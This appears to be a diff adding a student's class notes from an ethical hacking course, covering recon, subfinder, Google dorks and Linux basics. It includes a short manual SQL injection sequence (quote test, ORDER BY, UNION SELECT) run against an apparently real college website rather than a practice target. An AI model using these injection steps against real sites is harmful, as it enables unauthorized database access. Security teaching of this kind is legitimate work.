@@ -1,0 +1,313 @@
+
+07 October, 2025
+============================
+
+https://bcc.gov.bd/   - Web Browser - > DNS Server -> 
+159.13.20.79 -> 
+
+====================
+IP Address: 
+--------------------
+Private IP: 
+
+Public IP: 
+
+Cybersecurity
+=====================
+1. Offensive (Ethical Hacking) - RED Team
+2. Defensive (Digital Forensics, SOC) - Blue team
+
+
+Fundamentals of Ethical Hacking: 
+=====================================
+1. Networking 
+2. Operating System 
+Windows - 
+Linux - (Kali Linux, Parrot OS, Ubuntu)
+
+3. Internet, DNS, OSI Model
+4. Web fundamentals
+
+---------Hacking Lab------------
+1. VMWare Workstation
+2. Kali linux 
+
+
+
+
+- Web Application
+- Host
+- Network
+- Domain
+- Company 
+- Wireless
+
+
+
+1. Information Gathering/Recon/Reconnaissance
+2. Scanning
+3. Enumeration
+4. Exploitation
+5. Post-Exploitation
+
+
+Report 
+
+Freelancing
+Penetration Testing/
+VAPT - Vulnerability Assessment and Penetration Testing
+WordPress Malware Removal
+
+
+
+
+Bug Hunting- Hackerone, Bugcrowd
+--------------------------------
+
+Remote Job: 
+
+================
+
+
+
+Homework: 
+1. Get the private ip address of your mobile/computer
+2. Get the public Ip address of your home network
+3. Find some information of your public ip address
+
+
+http://gfcollege.in/cc-member-details.php?id=3
+
+
+
+
+
+'
+
+step 1: '   "
+Error/ Any changes 
+
+Step 2: 
+
+
+
+id -> Parameter
+3 -Value
+
+
+SELECT * FROM TABLE WHERE ID=3'--+ 
+http://gfcollege.in/cc-member-details.php?id=3' ORDER BY 1 --+ [Correct]
+http://gfcollege.in/cc-member-details.php?id=3' ORDER BY 10 --+ [Correct]
+http://gfcollege.in/cc-member-details.php?id=3' ORDER BY 20 --+ [False]
+http://gfcollege.in/cc-member-details.php?id=3' ORDER BY 15 --+ [Correct]
+http://gfcollege.in/cc-member-details.php?id=3'  Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --+
+http://gfcollege.in/cc-member-details.php?id=-3'  Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --+
+
+database()
+
+
+
+
+https://notepad.pw/bcc25
+
+27/10/2025:
+Tools Setup: 
+1. Kali linux: 
+https://www.kali.org/get-kali/
+
+2. To download VMWare Workstation: 
+Register here: https://profile.broadcom.com/web/registration 
+
+Temporary Mail: 
+https://temp-mail.org/ 
+
+
+
+
+b1c2c3
+
+========================================
+Target Scope: 
+1. Website [URL]
+http://testphp.vulnweb.com/   - 
+
+
+*.vulnvub.com 
+api 
+
+Domain: vulnvub.com 
+
+Subdomain: test.vulnvub.com 
+
+2. Network [ip]
+- Internal 
+- External
+
+10.0.0.11/24 [256 IP address]
+
+10.0.0.5 
+10.0.0.34
+10.0.0.100
+
+- How many hosts is in live
+
+
+
+Information Gathering: 
+
+1. Subdomain Enumeration: Get all the subdomains for the domain 
+
+subfinder
+1. apt install subfinder [To install subfinder]
+2. subfinder
+3. subfinder -up  [to update the version]
+4. subfinder -d bcc.gov.bd
+5. subfinder -d bcc.gov.bd -o bcc.gov.bd.txt
+
+cat bcc.gov.bd.txt | grep mail
+
+
+2. Manual Inspection: 
+- Visit the website as a normal user. 
+- go to view page source [CTRL+U], and search [CTRL+F] for sensitive keywords like: 
+api, password, admin, secret, key, token, http, https etc. 
+
+3. Google Dork: 
+Google Advaned Searcing technique
+
+site: searching within a specific website/domain
+inurl: Find keywords within URL. 
+Example: php?id site:vulnvub.in   ->
+intitle: 
+intext: intext:password site:vulnweb.com
+ext: 
+
+4. Technology Lookup (Wappalyzer - Technology profiler): Identify the underlying technologies of the website. 
+- Wappalyzer
+- Site report netcraft: https://sitereport.netcraft.com/
+- https://builtwith.com/
+
+5. 
+
+
+======================Ethical Hacking Labs=====================
+1. VMWare Workstation pro - Broadcam (After creating a account, we can download)
+Oracle Virtual Box (Opensource)
+
+2. Kali linux operating System. 
+Open from VMWare Workstation. 
+username: kali
+password: kali
+
+Kali Linux Commands we used so far: 
+1. ip address
+2. pwd
+3. ls 
+
+Commands help: 
+4. ls --help
+5. man ls
+6. To get previous commands we can use upper arrow key. 
+7. mkdir Salman (To create a directory with name Salman)
+8. apt update -y  (you may get permission denied) 
+sudo apt update -y
+9. cd folder_name 
+10. touch myinfo.txt [Create a empty file]
+11. wc -w myinfo.txt
+12. cat myinfo.txt 
+13. vim myinfo.txt
+i - INSERT mode 
+Esc - to change the mode
+:w - Save changes
+:q - quit
+:wq - Save and Exit
+
+14. cp source_file dest_file
+15. mv source_file dest_file
+16. Permissions: 
+
+read     write     execute
+ r		   w		  x
+ 4         2          1
+ 
+ 7 (rwx) 
+ 5 (r-x)
+ 4 (r--)
+ 
+ 755 
+
+17. whoami (to see the username)
+18. sudo su (To become superuser) 
+19. sudo adduser username
+
+subfinder
+1. apt install subfinder [To install subfinder]
+2. subfinder
+3. subfinder -up  [to update the version]
+4. subfinder -d bcc.gov.bd
+5. subfinder -d bcc.gov.bd -o bcc.gov.bd.txt
+
+cat bcc.gov.bd.txt | grep mail
+ 
+ 
+┌──(kali㉿kali)-[~/Desktop]
+└─$ mv myinfo.txt ../Documents/
+
+/home/kali/Desktop
+myinfo.txt
+
+mv myinfo.txt /home/kali/Documents
+
+/home/kali/Documents
+
+
+
+
+E:\Ethical Hacking\Tools 
+
+
+Extension: 
+1. program.txt     -> 
+2. program.xlsx
+3. program.php 
+4. program.pdf
+
+
+
+ 1st user  -> kali 
+ superuser -> root   /admin
+ 
+ 
+ Kali Linux File System Structure: 
+ / (Root Directory): The base of the entire file system hierarchy. All other directories and files branch off from here.
+/bin (User Binaries): Contains essential command-line utilities and executable programs accessible to all users (e.g., ls, cp, bash).
+/sbin (System Binaries): Holds system administration commands and binaries primarily used by the root user for system maintenance (e.g., fdisk, reboot, ifconfig).
+/etc (Configuration Files): Stores system-wide configuration files for various programs and services (e.g., /etc/passwd, /etc/fstab, /etc/resolv.conf).
+/dev (Device Files): Contains special files representing hardware devices (e.g., /dev/sda for a hard drive, /dev/tty1 for a terminal).
+/proc (Process Information): A virtual filesystem providing information about running processes and kernel parameters (e.g., /proc/cpuinfo, /proc/meminfo).
+/sys (System Information): Another virtual filesystem for interacting with the kernel and device drivers.
+/var (Variable Data): Stores variable data files, such as log files, mail queues, and temporary files that can change frequently (e.g., /var/log, /var/mail).
+/tmp (Temporary Files): A directory for temporary files created by users and applications, often cleared on reboot.
+/usr (Unix System Resources): Contains a large portion of the system's programs, libraries, documentation, and other resources that are not essential for the system to boot (e.g., /usr/bin, /usr/lib, /usr/share).
+/home (User Home Directories): Contains the home directories for regular users, where they store their personal files and configurations (e.g., /home/username).
+/root (Root User's Home Directory): The home directory specifically for the root user.
+/boot (Boot Files): Contains files necessary for the system to boot, including the Linux kernel and bootloader configuration (e.g., vmlinuz, grub).
+/lib (Libraries): Holds essential shared libraries required by programs in /bin and /sbin.
+/media (Removable Media): Used as a mount point for removable media devices like USB drives and DVDs.
+/mnt (Mount Point): A general-purpose mount point for temporarily mounting file systems.
+/opt (Optional Software): Intended for the installation of optional software packages not part of the standard system.
+ 
+ Domain/Subdomain
+ ---------------------------------
+ BCC Ethical Limited
+ bcceth.com (main domain)
+ Subdomains
+ --------------
+ forensics.bcceth.com (Forensics)
+ vapt.bcceth.com
+ va.vapt.bcceth.com
+ www.bcceth.com
+ 
+ 
+ 
+ 
